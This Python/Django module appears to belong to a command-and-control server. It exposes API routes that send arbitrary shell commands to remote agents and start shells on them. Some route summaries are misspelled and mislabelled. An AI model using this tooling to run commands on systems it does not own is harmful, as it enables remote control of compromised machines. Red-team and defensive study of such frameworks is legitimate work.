
from uuid import UUID
from pydantic import Field, BaseModel
from django.shortcuts import aget_object_or_404
from django.http import HttpRequest

from application.models import Agent
from application.services.view_base import ApiRouteV2
from application.shortcuts import make_task
from application.views.api.Schemas.general import TaskOut

from darkscryc2server.Models.ModulesSchemas.Execution import RunCommand, StartShellCommand
from darkscryc2server.Models.schemas import CommandIdentifiers
from darkscryc2server.Models.remote_tools_schemas import ManagerResponse
from darkscryc2server.Utils.remote_utils.commands import remote_send_command



class RunCommandSchema(BaseModel):
    command: str = Field(
        ...,
        title="Command",
        description="The command to be executed."
    )
    agent_id: UUID

with_agent_id_prefix = "/agents/{agent_id}/modules/execution/shell"
class ShellExecution(ApiRouteV2):
    def __init__(self, tags = ['Execution']):
        super().__init__(tags, prefix=with_agent_id_prefix)
        self.register_routes()

    
    async def run_command_task(self, request:HttpRequest, agent_id:UUID, payload:RunCommandSchema, *args, **kwargs):
        agent = await aget_object_or_404(Agent, AgentId=agent_id)
        command = RunCommand(command=payload.command).xml()
        job = await make_task(
            "remote_send_command_task",
            agent_id=str(agent.AgentId),
            command=command,
            _action_name=CommandIdentifiers.RUN_COMMAND
        )
        return TaskOut(task_id=job.job_id)
    
    async def start_shell_instance(self, request:HttpRequest, agent_id:UUID, *args, **kwargs):
        agent = await aget_object_or_404(Agent, AgentId=agent_id)
        command = StartShellCommand().xml()
        job = await make_task(
            "remote_send_command_task",
            agent_id=str(agent.AgentId),
            command=command,
            _action_name=CommandIdentifiers.START_SHELL_INSTANCE
        )
        return TaskOut(task_id=job.job_id)
    
    async def run_command(self, request:HttpRequest, agent_id:UUID, payload:RunCommandSchema, *args, **kwargs):
        command = RunCommand(command=payload.command).xml()
        return await remote_send_command(conn_id=str(agent_id), command=command)
    



    
    def register_routes(self):
        self.register_route(
            path="/start_shell", 
            methods=["GET"], 
            view_func=self.start_shell_instance, 
            response={200:TaskOut},
            summary="Satrt a shell on an agent"
        )
        self.register_route(
            path="/run_command_task", 
            methods=["POST"], 
            view_func=self.run_command_task, 
            response={200:TaskOut},
            summary="Fetsh basic machine ibfo"
        )
        self.register_route(
            path="/run_command", 
            methods=["POST"], 
            view_func=self.run_command, 
            response={200:ManagerResponse},
            summary="Fetsh basic machine ibfo"
        )
    
    